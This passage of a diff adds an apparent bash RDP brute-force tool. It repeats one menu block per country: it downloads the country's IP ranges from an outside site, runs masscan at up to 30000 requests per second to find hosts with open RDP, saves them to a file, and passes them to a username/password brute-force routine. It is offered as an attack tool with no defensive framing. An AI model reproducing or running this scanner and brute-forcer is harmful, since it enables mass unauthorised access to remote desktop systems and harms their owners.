+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "124" ]; then
+curl http://ipdiapazon.16mb.com/Mozambique.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "125" ]; then
+curl http://ipdiapazon.16mb.com/Myanmar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "126" ]; then
+curl http://ipdiapazon.16mb.com/Namibia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "127" ]; then
+curl http://ipdiapazon.16mb.com/Nauru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "128" ]; then
+curl http://ipdiapazon.16mb.com/Nepal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "129" ]; then
+curl http://ipdiapazon.16mb.com/Netherlands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "130" ]; then
+curl http://ipdiapazon.16mb.com/Netherlands_antilles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "131" ]; then
+curl http://ipdiapazon.16mb.com/New_caledonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "132" ]; then
+curl http://ipdiapazon.16mb.com/New_zealand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "133" ]; then
+curl http://ipdiapazon.16mb.com/Nicaragua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "134" ]; then
+curl http://ipdiapazon.16mb.com/Niger.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "135" ]; then
+curl http://ipdiapazon.16mb.com/Nigeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "136" ]; then
+curl http://ipdiapazon.16mb.com/Niue.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "137" ]; then
+curl http://ipdiapazon.16mb.com/Non-spec.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "138" ]; then
+curl http://ipdiapazon.16mb.com/Norfolk.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "139" ]; then
+curl http://ipdiapazon.16mb.com/Northern.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "140" ]; then
